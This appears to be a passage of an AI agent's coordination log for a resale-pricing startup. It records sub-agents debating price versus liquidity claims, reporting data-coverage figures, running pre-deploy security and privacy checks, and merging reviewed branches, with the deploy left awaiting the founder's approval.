> for a reappearance. A bounded afternoon, and it yields a correction factor. **The level error is
> not measurable from Vinted's public surface at all. Not with more scraping, not ever.**
>
> It is not "one claim is true and the other false." It is **one claim has a path to verification and
> the other has none.**

**THE SYNTHESIS — and it dissolves the dilemma from a different side than `ux-researcher` did:**

> *"What should I pay?" is not a price question. It is a **liquidity question wearing a price mask.**
> `max_buy = avg × 0.95 × 0.70`. The 0.95 is Vinted's fee — a fact. **The 0.70 is a margin
> requirement, and margin requirement is a function of liquidity.** Every reseller alive pays 85 % of
> resale for something that turns in five days and 50 % for something that sits six months. That is
> the entire craft. **The formula uses a flat 0.70 for every model on the board** — so the product's
> central number, the paywalled field, the thing beside Vinted's Buy button, **discards the one signal
> the product is best at measuring.**

- [ ] **`buy_below` should be a function of observed departure velocity, not a constant multiple of an
      unobservable sale price.** It keeps the paying moment, the extension surface and
      `getTrialRecap`, and makes the number **more** defensible — the risk term stops being a guess
      and becomes the measured quantity. *"At €35, items like this have historically left the shelf
      within 6–11 days (n=14)."*

**WHAT BREAKS — nobody had counted it, and two entries are decisive:**

20+ customer surfaces carry `buy_below`. **And:** (1) **the North Star is DEFINED on
`said_buy_below`** — reposition and `weekly_trusted_checks` does not degrade, it **goes to zero
permanently** and the top-line KPI needs redefining in the same quarter we are proving ten customers.
(2) **The only two feedback machines that exist are price-shaped** — `outcome_calibration.py:81-82`
and `prediction_eval.py` both grade price calls. **Repositioning would orphan the only channels
through which reality could ever contradict us — deepening the closed loop, not opening it.**

Relabelling costs days. Repositioning is *"not a repositioning, that is a rebuild."*

**AND IT RE-READ `data-scientist`'s MEASUREMENT — 16 of 22 HIGH searches on one SKU:**

> **"The catalogue is not too thin. It is too WIDE."** Evidence spread across 26 brands × 10
> categories × 5 markets is thin everywhere, and demand is concentrated on roughly one product
> anyway. **Narrowing the board makes BOTH claims stronger simultaneously** — more comps *and* more
> departures. No positioning decision, no metric redefinition, nothing breaks. **Strictly dominant.**

**ITS VERDICT: do not reposition, and not on the strength of a brainstorm.**

> *"The case for repositioning is 'nobody has evidence the price claim is true.' The case against is
> 'nobody has evidence anyone will pay for a velocity signal.' **Both are appeals to absent
> evidence.** Choosing between two unfalsified hypotheses by argument — however good the argument —
> is precisely the failure mode I spent the brainstorm warning about. I would be doing the thing I
> criticised, one level up, with the whole company as the stake."*

**Its ordering, which I am adopting:**
1. **Relabel now.** Every "sold" on the site is a claim the data cannot support. `DATA.md:226-229`
   concluded this in **Phase 1 and nobody acted.** Owed under OS §0.2 regardless of AM-8.
2. **Narrow the board** to models with real depth.
3. **Make `buy_below` a function of measured velocity** instead of a flat 0.70.
4. **Then resolve A16 on ten customer answers**, not on argument — put both artefacts in front of the
   next ten people and ask which they would pay for. **A free byproduct of work the founder needs
   anyway.**


#### A16 — the remaining votes, and the finding that reframes it

**`content-social` found the number that changes the shape of the question.** The model-label ceiling
is **7.0 %** (7,247 of 103,993 observed sales carry a model label). But a **brand** label is present
on **93.2 %**.

> *"'New Balance sneakers: 309 sold this week' rests on data an order of magnitude deeper than 'New
> Balance 530: pay no more than €26.88.' Liquidity is the claim shape that happens to match where the
> data is actually deep."*

And it re-ran the demand log: **only 151 of 360 logged searches (41.9 %) ever get a price at all**,
even at the loose `n ≥ 8` bar. **A price-led pitch is structurally answerable for well under half of
real demand today.**

It also corrected my framing of its earlier answer: the honesty caveat "attaches to nothing" because
it was an *abstract* claim. **A per-item volume number has a decision moment** — *is this worth
sourcing at all* — and it can answer that for far more visitors than the price claim can answer its
own question for.

**`monetization` supplied the counterweight, verified against `engine/sufficiency.py` before
accepting the premise:** sell-through and momentum require a **stricter** evidence floor
(`MIN_SOLD_30D = 30`) than price does (`n ≥ 8`). So *"rates survive, levels do not"* holds for
**bias** — a systematic offset cancels in a ratio — **but not for evidence volume.**

**THE UNRESOLVED TENSION, stated rather than smoothed over:** brand-level volume is deep (93 %
labels) while per-model rate claims need `MIN_SOLD_30D = 30`, which is *stricter* than the price bar.
Both can be true — they are claims at different granularities — but **nobody has measured how many
models clear 30 observed departures.** That number decides whether a per-model velocity claim is
wider or narrower than the price claim it would replace. **Requested from `data-scientist`.**

---

### A16 — WHERE THE VOTE ACTUALLY LANDS

Four positions, and read together they converge far more than they conflict:

| | position |
|---|---|
| `tech-lead` | **Do not reposition.** Relabel, narrow the board, and make `buy_below` **a function of measured velocity** rather than a flat 0.70 |
| `ux-researcher` | Not a straight swap — the extension answers a transactional question. But a **fully observable anchor** (asking vs live shelf average) needs no sale inference at all |
| `content-social` | **Lead with volume/velocity now**, at brand granularity where the data is deep; keep price secondary and hedged with its `n` |
| `monetization` | **Lead Pro's pitch with rank/momentum**, keep price as a labelled secondary anchor, do not invert the free/paid line, hold €19/€49 |

**Three of four say lead with velocity and keep the price. The fourth says keep the price and make it
velocity-driven.** Those are the same product from two directions.

**THE SYNTHESIS — no reposition, no rebuild, and it is what all four are describing:**

1. **Lead with what moves.** Brand/category volume, where 93 % label coverage supports it.
2. **Keep `buy_below`** — it is the paying moment and the extension's reason to exist.
3. **Make it a function of measured velocity** instead of a flat 0.70, so the risk term stops being a
   guess (`tech-lead`) and the number gets *more* defensible.
4. **Never show it without its `n`**, and never above `comparable_n < 8`.
5. **Relabel every "sold"** — in flight now.

**Nothing here requires the rebuild `tech-lead` costed** (20+ surfaces, the North Star's definition,
both feedback machines). **And A16's formal question stays OPEN**, to be settled where `tech-lead`
said it should be: **on ten customer answers, as a byproduct of work the founder needs anyway** —
put both artefacts in front of the next ten people and ask which they would pay for.

**One citation to reconcile before this reaches the founder:** `content-social` could not locate
"6 models / 12.2 % of searches" on disk; the nearest verified figures are 43/100 at `n ≥ 8` and ~7/100
at `n ≥ 30`. Same direction, different number. **`data-scientist` to reconcile — no figure goes in
front of the founder until it does.**


#### Step 1 of `tech-lead`'s ordering is DONE — the "sold" relabel (`816adeb`)

Branch `claude/content-social/sold-relabel`, **37 files.** This was owed since **Phase 1**:
`DATA.md:226-229` concluded *"every occurrence of the word 'sold' on the site is currently a claim the
data cannot support"* and nobody acted for weeks.

`/methodology` — the page whose entire job is telling the truth about the number, and which carried
the strongest false claim (*"confirms items actually sold"*) — now states plainly, once, that we watch
a listing disappear and infer a sale at its **last asking price**, never a receipt; that a departure
can be a delisting, a removal, an offline sale or a **relist under a new id**; and it names
`tech-lead`'s finding that **relists bias toward slow-moving items**, because a seller relists what is
not selling.

Also fixed: the extension's `avg sold` → `avg exit` across **all six locales** (the highest-exposure
surface), `i18n.ts` in en/fr/es, the public API docs, `llms.txt`, seven dashboard routes, and the SEO
content lines catalogued in the earlier truth audit.

**Its "deliberately left" list is the better half of the work.** `portfolio/` and `outcome-prompt`
keep the word because that is the **user's own confirmed transaction**, manually logged — genuinely
sold, not inferred. `data/page.tsx`'s headers are locked by a literal e2e assertion and changing one
without the test would exceed a copy-only PR. The velocity labels ("X sold/week") are counts, not
price claims — the less acute half, and the SEO lane's.

**Verified, and every claim held up:** `tsc` clean, build succeeds, five check scripts green,
**24/24 e2e**, and a new `proof.sh` at **14/14 cold** — I re-ran it myself from `/tmp`.

**One correction to my own verification.** I first checked identifier safety by counting *removed*
lines containing `sold_7d`/`sold_at`/`sold_observed`, got 10, and briefly read that as a rename. It
was not: 9/1/3 removed and **exactly** 9/1/3 re-added — they sat on lines whose surrounding copy
changed. **My check was crude in the same way two earlier checks of mine were tonight** — counting one
side of a diff. The agent's claim was right and mine was wrong.


#### A16 — the measurement that reframes the vote. **The shelf covers 100/100. Price covers 2.**

`data-scientist`, board snapshot 2026-09-01 00:38:49, ±3 pp rebuild noise.

**It corrected its own figure first, and the correction matters.** Last turn it reported the price
HIGH band as 6 models / 12.2 % of searches. That was `n ≥ 30` **alone**. `_verdict_confidence` gates
HIGH on **three** conditions — `comparable_n ≥ 30` **AND** `data_quality ≥ 70` **AND**
`IQR/median ≤ 0.60`. **The real band is 2 models and 9.4 % of searches.** The tier design was being
scoped against a band three times larger than the one the code actually produces.

**THE HEADLINE:**

| option | models | searches | **inference required** |
|---|---:|---:|---|
| price HIGH (today's actual gate) | **2 / 100** | 9.4 % | departure = sale, price stable |
| price MEDIUM (`n ≥ 8`, post-A13) | 63 / 100 | 81.1 % | departure = sale |
| liquidity HIGH (departures ≥ 30) | 19 / 100 | 30.0 % | departure = sale |
| **shelf (active asking price)** | **100 / 100** at `active ≥ 30` | not yet scored | **NONE** |

`active_listings`: min **31**, median **980**, p75 2,857, max 82,517. **Every model on the board has
an observable shelf. Six have a defensible price claim, and only two survive the full gate.**

**`ux-researcher`'s third option is the largest gap of the night** — the only option that covers the
whole board while requiring **no sale inference at all**.

**The dispersion hypothesis: confirmed, and NOT the constraint.** Removing the penalty entirely takes
HIGH from 2 → 5 models. **94 of 100 never reach `n = 30` at all.** Count binds; dispersion is an order
of magnitude smaller.

**But the dispersion data is worth more than the hypothesis it tested:**

> `IQR/median` across the board: n=93, **median 0.71**, p90 1.56, max 7.75. **59 of 93 models exceed
> the 0.60 threshold.**

**Wide price spread is the NORMAL state of this catalogue, not an exception.** The honest default
output is a **range, not a point** — `ux-researcher`'s instinct, confirmed at a different layer.

**Liquidity:** materially wider at HIGH (19 models / 30 % vs 2 / 9.4 %), **indistinguishable at
MEDIUM** (83.3 % vs 81.1 %). Its own read: *"A tier whose confident claim fires on fewer than one
search in three is not a repositioning; it is a narrower promise with the same underlying thinness."*

**FOUR CAVEATS IT RAISED AGAINST ITS OWN RESULT — the third is it being wrong:**

1. **Identity-filtered shelf coverage is UNKNOWN.** Three scans timed out. A 12-model sample gave a
   **median identity pass-rate of 50.1 %** — about half of "active" is cases, kits and wrong models.
   **It refused to extrapolate to the other 88.**
2. It is an **asking price, not a value**. **It cannot support a buy-below and must never be labelled
   one.**
3. **Its own survivorship prediction was wrong.** It expected the shelf above the departure mean.
   Measured: **median −12.9 %, shelf above in only 4 of 12.**
4. **That disagreement is mostly evidence about the SOLD estimate.** `Nike Dunk`: departure mean
   **€160.67 off 11 comps** vs shelf mean **€28.42 across 123 clean listings** — 10–40× more
   observations. **Which is closer to a transaction price is UNKNOWN and unknowable.**

- [ ] **Next, explicitly not guessed:** identity-filtered shelf count for all 100 models, and the
      shelf band scored against the same 180-search population. **A batch job against a snapshot copy
      per AM-1.** Until it runs, **the shelf option's search coverage is UNKNOWN and must not be
      quoted.**


---

### A18 — **this repo may never be made public without a scrub pass**

`tech-lead`, during the AM-7 deploy consult. **Standing constraint, not a task.**

The diff being pushed carries **45 references to production topology** — Hetzner, Coolify,
`/app/data/demand_intel.db`, the `ssh + docker exec` read path. Plus `CLOSED-LOOP.md` and
`COVERAGE.md`, which state frankly that the central constant is unvalidated, that the labelling
ceiling is 7 %, and that the price claim is defensible on **2 of 100 models**.

**All of that is correct to keep in a private repo and would be a competitor's dossier and a
customer's refund argument in a public one.** `BilalSbaiby-OT/resale-iq-frontend` is confirmed
private (`gh repo view`, not assumed).

> *"Nothing enforces that it stays private. Cheap now, unrecoverable later — history is forever."*

- [ ] **Never flip this repository to public without a scrub pass** over production topology and the
      candid audit files. Rewriting history after the fact does not undo a clone.

**Also cleared in the same consult, and worth recording as verified rather than assumed:**
- No credentials in the diff. Three apparent hits, all benign: an ssh **host alias** (no user, host or
  key), a deliberate `"." + "env"` string-split in a proof script, and a `startsWith('sk_live_')`
  **mode check** reading an env var rather than a literal key.
- `.claude/hooks/` is **already** on `origin/main` — the rails are not new exposure.
- `.gitignore` correctly excludes `DEPLOY_APPROVED`; no `LOCK`, `UNLOCK_HARNESS` or
  `dashboard/status.json` is tracked in the tree being pushed.

---

### A19 — deploy consult CLEARED. **Push `resale-iq`. Merge nothing in `demand-intel`.**

**`tech-lead` corrected my framing, and the correction is the point.** I called the push "low-risk
because none of the work that matters is on main."

> **"Low-risk, yes. A no-op, no."** `deploy.yml` triggers on `workflow_run` from Agent Isolation on
> `main`. **Pushing these 83 commits IS a production deploy of the frontend**, unattended, at the end
> of a long night.

**Its two pre-flight checks, both now run and both clean:**

| check | result |
|---|---|
| does `deploy.yml` gate on success? | **YES** — `:54`, `conclusion == 'success'`. A red CI does not ship |
| is a lockfile committed? | **YES** — `package-lock.json` tracked, so the rebuild pins transitives and the caret ranges cannot drift |

**Do not split the push.** Any push to `main` fires the same deploy chain, so holding back the `e2e/`
files reduces deploy risk by nothing and only delays the CI changes. The `e2e` specs are the A15
breach and carry its **needs-work** verdict — a mock merging two backend return paths, and the 40.9 %
misattribution — but both are **test-fidelity defects with zero user-facing effect.** Push them, fix
them on a branch.

**The real argument for pushing tonight is one I had not made:** these 83 commits exist **on one
laptop**, in a company `devops` found has **no verified offsite backup**. The push is a backup first
and a redeploy second.

**And the clear NO:** merge nothing in `demand-intel` tonight. Its `main` genuinely deploys the API,
and A13 carries an open request-changes. *"Merging tonight to deliver the actual fixes would ship an
unquantified change to a paid price field at 4am. That is precisely the shape of thing that produced
C6."* FX v2 is approved and can go first thing.

**Blocked only on `.claude/DEPLOY_APPROVED`**, which is the founder's to create. Attend the deploy;
health check after; rollback ready.


#### A19 — `security-eng` clears the push, and checked the one thing that could have been a real leak

**Remote verified against GitHub's API**, not inferred: `gh repo view --json visibility,isPrivate` →
`{"isPrivate": true, "visibility": "PRIVATE"}`.

**It went looking for the founder's phone number and confirmed it is not there.** `SECURITY-LOG.md`
records a blocked heredoc that created `ESCALATION.md`; it pulled that entry, read the committed file
in full, and confirmed the number is genuinely absent — routed through `with-secrets.sh` as
`FOUNDER_PHONE` instead. **That was the one credible PII risk in the whole push and it is clean.**

| item | result |
|---|---|
| `dashboard/data.json` (51 KB) | scanned for email, Stripe-prefix, JWT, bearer, IP and entropy patterns. **Two `@` hits total, both `noreply@anthropic.com` in a git trailer.** The 123 entropy candidates are all filenames. No PII, no credential |
| `SECURITY-LOG.md` (298 lines) | every entry is a **blocked** call, so it records the attempted command and **never its output.** Zero secret shapes |
| `CLOSED-LOOP.md`, `APPROVALS.md`, `COVERAGE.md` | zero secret/email matches. Business-sensitive, which is answered by "private repo", not a credential question |
| `.gitignore` | **nothing gets dropped** — verified two ways: `git diff --diff-filter=D` is empty across all 83 commits, and a full `git ls-tree -r` comparison confirms nothing in the remote tree is absent from what ships |

**What the log genuinely does reveal, stated rather than waved away:** local paths under
`/Users/bilalsbaiby/…` (leaks a macOS username — trivial, and the repo already carries the owner's
identity), an SSH host alias confirming the hosting provider (mildly useful to a competitor, not
exploitable), and one entry exposing the secret-scan regex used to audit git history (shows
methodology, not a credential).

**And one item outside my five questions:** `guard.py` itself is in the push — 120 changed lines,
including tonight's CRITICAL bypass fix. Normal for security tooling to live beside what it guards,
not a reason to hold, **flagged so nobody is surprised.**

**A correction to me:** I told the roster `COVERAGE.md` lives in `docs/company/`. It is
`docs/audit/COVERAGE.md`.

**BOTH AM-7 CONSULTS ARE NOW CLEAR.** `tech-lead`: push all 127, do not split, merge nothing in
`demand-intel`. `security-eng`: safe on every checkable dimension. **The only thing outstanding is
`.claude/DEPLOY_APPROVED`, which is the founder's to create.**


---

### A20 — **MERGED to `demand-intel` main: C6, C5, C4.** Three reviewed changes, nothing else.

`tech-lead` gave a full review and an explicit merge order. Executed exactly, nothing added.

| # | | |
|---|---|---|
| 1 | **squash**-merge `fx-currency-v2` | `7942faf` |
| 2 | cherry-pick `c1143d3` (C5) | `dafaa8d` |
| 3 | cherry-pick `d3850d9` (C4) | `e771ea7` |

**Verified after:** `1180 passed` · `docs/audit/proof/fx-currency/proof.sh` **16/16 cold** ·
`git merge-base --is-ancestor af4042d main` → **ABSENT.**

**Why squash, and it is not tidiness.** `fx-currency-v2` carries a rewritten copy of the rejected
commit as its base. A normal merge would put a commit into `main` **whose tree still drops rows in
`parse_item`** — `git bisect` could land on it and reproduce the fabricated-sales bug against a commit
legitimately in `main`'s history. *"That is the difference between 'the bug is not in main' and 'the
bug is not in main at any point.'"*

**`claude/backend-eng/data-defects-c6-c5-c4` is deleted**, because it still carried the rejected
`af4042d` — *"so nobody finds it later and finishes the job."* All three SHAs recoverable via reflog.

**TWO INDEPENDENT CONFIRMATIONS OF THE SAME INTERACTION, and this is why the order matters.**

`tech-lead` predicted by reading that **C5 must land before `gate-paid-surfaces`**: the gate branches
from `main`, where `verdict_allows_buy_below({})` still returns `True`, and its legacy-row docstring
*"becomes false the moment C5 lands."*

**I found it independently by rehearsing the merge in a throwaway worktree: 11 failures on the
combined tree** — 6 in `test_entitlement_redaction`, 3 in `test_deals_str`, plus the gate's own
`test_legacy_row_with_no_n_at_all_is_not_reported_as_zero`. **Every branch passed alone. Together
they did not.** Merging all six tonight would have shipped that.

- [ ] The gate's legacy-row docstring must be corrected before it merges — it describes behaviour the
      code cannot produce once C5 is in.

**HELD, and named as UNREVIEWED rather than rejected** — `tech-lead` declined to approve on test
counts, which is the right refusal: *"C6 passed 1173 tests. A13 passed everything and still moved 41
published prices. A test count tells me the branch is internally consistent. It tells me nothing about
what I actually check for."*

`gate-paid-surfaces` + `a13` (one release, after the docstring fix, the call-site read, and confirming
`Levi's Trucker` is inside the gated 18) · `pending-failsafe` · `delete-ecc-harness` ·
`lifecycle/trial-emails` (**and I am partly its author, so I cannot review it either**) · all four
`resale-iq` branches.

**A15 ruled:** `frontend-eng/conversion-moments` **wins** the three overlapping files — it is verified
24/24, `designer` is unverified for want of a shell. *"Merging unverified work over verified work on
the same three files destroys the verification."* `designer` rebases on top and re-runs the specs.

**A13 approved conditionally**, with a disclosure requirement: 18 of the 41 are suppressed by the
gate, **but the other 23 cross 8 and publish their swing anyway — median 20.3 % on a paid field.**
That must be **stated in the release note, not absorbed.**
